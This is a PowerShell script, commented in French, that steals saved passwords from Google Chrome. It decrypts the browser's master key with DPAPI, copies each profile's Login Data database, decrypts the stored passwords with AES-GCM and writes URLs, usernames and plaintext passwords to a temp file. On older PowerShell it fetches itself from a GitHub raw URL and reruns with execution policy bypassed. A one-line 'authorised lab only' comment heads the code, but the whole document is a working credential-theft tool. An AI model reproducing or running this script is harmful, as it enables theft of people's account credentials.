# Lab / machine autorisee uniquement. Cibles Google Chrome (Chromium).
# Utilise pwsh 7+ (AesGcm) et sqlite3 dans PATH.
param(
    [string]$ScriptSourceUrl = 'https://raw.githubusercontent.com/BL4CK-SUN/Ducky/main/chrome-extract.ps1'
)

$ErrorActionPreference = 'SilentlyContinue'

if ($PSVersionTable.PSVersion.Major -lt 7) {
    $pwsh = (Get-Command pwsh -ErrorAction SilentlyContinue).Source
    if (-not $pwsh) { throw 'PowerShell 7 requis (AesGcm). Installe pwsh ou lance via leonardo-plan-a.ps1.' }
    $self = $MyInvocation.MyCommand.Path
    if (-not $self -or -not (Test-Path -LiteralPath $self)) {
        $self = Join-Path $env:TEMP 'chrome-extract.ps1'
        try {
            Invoke-WebRequest -Uri $ScriptSourceUrl -UseBasicParsing -OutFile $self
        } catch {
            throw "PowerShell 7 requis ; re-telechargement echoue : $($_.Exception.Message)"
        }
    }
    & $pwsh -NoProfile -ExecutionPolicy Bypass -File $self @args
    exit $LASTEXITCODE
}

function Get-ChromeMasterKey {
    param([string]$LocalStatePath)
    $json = Get-Content -LiteralPath $LocalStatePath -Raw | ConvertFrom-Json
    if (-not $json.os_crypt.encrypted_key) { return $null }
    $raw = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
    if ($raw.Length -le 5) { return $null }
    if ([Text.Encoding]::ASCII.GetString($raw[0..4]) -eq 'DPAPI') { $raw = $raw[5..($raw.Length - 1)] }
    return [Security.Cryptography.ProtectedData]::Unprotect($raw, $null, 'CurrentUser')
}

function ConvertFrom-Hex {
    param([string]$Hex)
    if (-not $Hex) { return [byte[]]@() }
    $bytes = New-Object byte[] ($Hex.Length / 2)
    for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = [Convert]::ToByte($Hex.Substring($i * 2, 2), 16) }
    return $bytes
}

function Unlock-ChromePassword {
    param([byte[]]$Blob, [byte[]]$MasterKey)
    if (-not $Blob -or $Blob.Length -lt 4) { return $null }
    $head = [Text.Encoding]::ASCII.GetString($Blob[0..2])
    if ($head -eq 'v20') { return '[ABE v20: non decryptable hors process Chrome]' }
    if ($head -eq 'v10' -or $head -eq 'v11') {
        if (-not $MasterKey -or $Blob.Length -lt 31) { return '[cle manquante ou blob invalide]' }
        $nonce = $Blob[3..14]
        $tag = $Blob[($Blob.Length - 16)..($Blob.Length - 1)]
        if ($Blob.Length -eq 31) { return '(mot de passe vide)' }
        $cipher = $Blob[15..($Blob.Length - 17)]
        if ($cipher.Length -eq 0) { return '(mot de passe vide)' }
        $plain = New-Object byte[] $cipher.Length
        $aes = [System.Security.Cryptography.AesGcm]::new($MasterKey)
        try { $aes.Decrypt($nonce, $cipher, $tag, $plain, $null) } catch { return '[echec AES-GCM - possible ABE / cle Chrome]' } finally { $aes.Dispose() }
        return [Text.Encoding]::UTF8.GetString($plain)
    }
    try {
        return [Text.Encoding]::UTF8.GetString([Security.Cryptography.ProtectedData]::Unprotect($Blob, $null, 'CurrentUser'))
    } catch {
        return '[echec DPAPI]'
    }
}

$sqlite = (Get-Command sqlite3 -ErrorAction SilentlyContinue | Select-Object -First 1).Source
if (-not $sqlite) { throw 'sqlite3 introuvable dans PATH.' }

$userData = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'
if (-not (Test-Path -LiteralPath $userData)) { throw 'Chrome User Data introuvable.' }

$localStatePath = Join-Path $userData 'Local State'
$lsJson = Get-Content -LiteralPath $localStatePath -Raw | ConvertFrom-Json
$masterKey = Get-ChromeMasterKey $localStatePath
$abe = [bool]$lsJson.os_crypt.app_bound_encrypted_key
$out = Join-Path $env:TEMP 'chrome-leonardo.txt'
$lines = [System.Collections.Generic.List[string]]::new()
$lines.Add('Chrome export ' + (Get-Date -Format 'o'))
$lines.Add('MasterKey: ' + ($(if ($masterKey) { 'ok (' + $masterKey.Length + ' bytes)' } else { 'absent' })))
$lines.Add('App-Bound Encryption (ABE): ' + ($(if ($abe) { 'present (v20 = non decryptable hors Chrome)' } else { 'non' })))
$lines.Add('')

$profiles = Get-ChildItem -LiteralPath $userData -Directory |
    Where-Object { $_.Name -match '^(Default|Profile \d+)$' }

foreach ($prof in $profiles) {
    $loginSrc = Join-Path $prof.FullName 'Login Data'
    if (-not (Test-Path -LiteralPath $loginSrc)) { continue }
    $loginDst = Join-Path $env:TEMP ("chrome-login-{0}.db" -f ($prof.Name -replace '\s', '_'))
    if (Test-Path -LiteralPath $loginDst) { Remove-Item -LiteralPath $loginDst -Force }
    Copy-Item -LiteralPath $loginSrc -Destination $loginDst -Force
    if (-not (Test-Path -LiteralPath $loginDst)) {
        $lines.Add(('=== Profil: {0} ===' -f $prof.Name))
        $lines.Add('Login Data: copie impossible (Chrome verrouille le fichier).')
        $lines.Add('')
        continue
    }

    $query = 'SELECT origin_url, username_value, hex(password_value) FROM logins;'
    $rawRows = & $sqlite -batch -noheader -separator "`t" $loginDst $query 2>$null
    if (-not $rawRows) {
        $lines.Add(('=== Profil: {0} ===' -f $prof.Name))
        $lines.Add('(aucune ligne ou erreur sqlite)')
        $lines.Add('')
        Remove-Item -LiteralPath $loginDst -Force -ErrorAction SilentlyContinue
        continue
    }

    $lines.Add(('=== Profil: {0} ===' -f $prof.Name))
    foreach ($row in $rawRows) {
        $parts = $row -split "`t", 3
        if ($parts.Count -lt 3) { continue }
        $url, $user, $hex = $parts[0], $parts[1], $parts[2]
        $blob = ConvertFrom-Hex $hex
        $pass = Unlock-ChromePassword -Blob $blob -MasterKey $masterKey
        if (-not $pass) { $pass = '(vide / non decode)' }
        $lines.Add('URL:  ' + $url)
        $lines.Add('User: ' + $user)
        $lines.Add('Pass: ' + $pass)
        $lines.Add('')
    }
    Remove-Item -LiteralPath $loginDst -Force -ErrorAction SilentlyContinue
}

$lines | Set-Content -LiteralPath $out -Encoding utf8
Start-Process notepad.exe -ArgumentList $out
Write-Output $out